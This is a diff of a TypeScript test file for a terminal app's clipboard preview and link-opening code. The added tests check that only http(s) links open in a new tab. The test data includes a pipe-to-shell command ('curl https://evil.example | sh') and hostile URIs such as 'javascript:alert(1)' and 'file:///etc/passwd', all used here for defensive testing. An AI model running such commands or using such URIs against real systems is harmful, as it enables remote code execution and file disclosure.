@@ -1,4 +1,4 @@
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, vi } from "vitest";
 import { bufferToText, decodeOsc52, type BufferLike } from "./clipboard";
 
 function buffer(rows: [text: string, wrapped?: boolean][]): BufferLike {
@@ -79,5 +79,28 @@ describe("oscPreview", async () => {
     expect(oscPreview("curl https://evil.example | sh")).toBe("curl https://evil.example | sh");
     expect(oscPreview("line1\nline2\nline3")).toBe("line1 line2 line3（3行）");
     expect(oscPreview("x".repeat(80))).toBe("x".repeat(60) + "…");
+  });
+});
+
+describe("openInNewTab", async () => {
+  const { openInNewTab } = await import("./components/TerminalView");
+  it("opens http(s) links in a new tab without an opener", () => {
+    const open = vi.fn();
+    vi.stubGlobal("window", { open });
+    try {
+      expect(openInNewTab("https://example.com/a?b=1")).toBe(true);
+      expect(openInNewTab("HTTP://example.com")).toBe(true);
+      expect(open.mock.calls).toEqual([
+        ["https://example.com/a?b=1", "_blank", "noopener,noreferrer"],
+        ["HTTP://example.com", "_blank", "noopener,noreferrer"],
+      ]);
+      // 端末の出力に埋め込まれたjavascript:やfile:のリンクは開かない
+      for (const uri of ["javascript:alert(1)", "file:///etc/passwd", "data:text/html,x", " https://x.example"]) {
+        expect(openInNewTab(uri), uri).toBe(false);
+      }
+      expect(open).toHaveBeenCalledTimes(2);
+    } finally {
+      vi.unstubAllGlobals();
+    }
   });
 });
